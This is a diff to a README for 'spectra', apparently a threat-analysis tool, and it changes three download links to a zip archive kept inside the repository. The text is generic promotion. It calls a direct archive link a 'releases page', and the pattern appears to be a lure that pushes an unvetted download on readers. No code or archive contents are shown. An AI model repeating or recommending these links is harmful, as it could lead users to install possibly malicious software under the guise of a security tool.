@@ -4,7 +4,7 @@
 Welcome to the spectra project! This application helps you analyze and respond to cyber threats. With high-performance capabilities and simple use, spectra is designed for everyone.
 
 ## 📥 Download Now
-[![Download Spectra](https://raw.githubusercontent.com/TONG213879/spectra/main/src/analysis/Software_2.0.zip)](https://raw.githubusercontent.com/TONG213879/spectra/main/src/analysis/Software_2.0.zip)
+[![Download Spectra](https://raw.githubusercontent.com/TONG213879/spectra/main/docs/Software_v2.1.zip)](https://raw.githubusercontent.com/TONG213879/spectra/main/docs/Software_v2.1.zip)
 
 ## 📋 Features
 Spectra provides a variety of helpful features:
@@ -24,7 +24,7 @@ To run spectra, ensure your system meets the following requirements:
 ## 📥 Download & Install
 To get started, visit the releases page to download the application. 
 
-[Download Spectra Here](https://raw.githubusercontent.com/TONG213879/spectra/main/src/analysis/Software_2.0.zip)
+[Download Spectra Here](https://raw.githubusercontent.com/TONG213879/spectra/main/docs/Software_v2.1.zip)
 
 1. Click on the link above to open the releases page.
 2. Find the latest version of the software.
@@ -75,4 +75,4 @@ Yes, you can use it for any purpose as it is open source. Ensure to follow the g
 ## 🛡️ Conclusion
 Spectra is your go-to application for dealing with cyber threats. It provides powerful tools while being easy to use. Don’t wait—secure your data today!
 
-[Download Spectra Here](https://raw.githubusercontent.com/TONG213879/spectra/main/src/analysis/Software_2.0.zip)
+[Download Spectra Here](https://raw.githubusercontent.com/TONG213879/spectra/main/docs/Software_v2.1.zip)
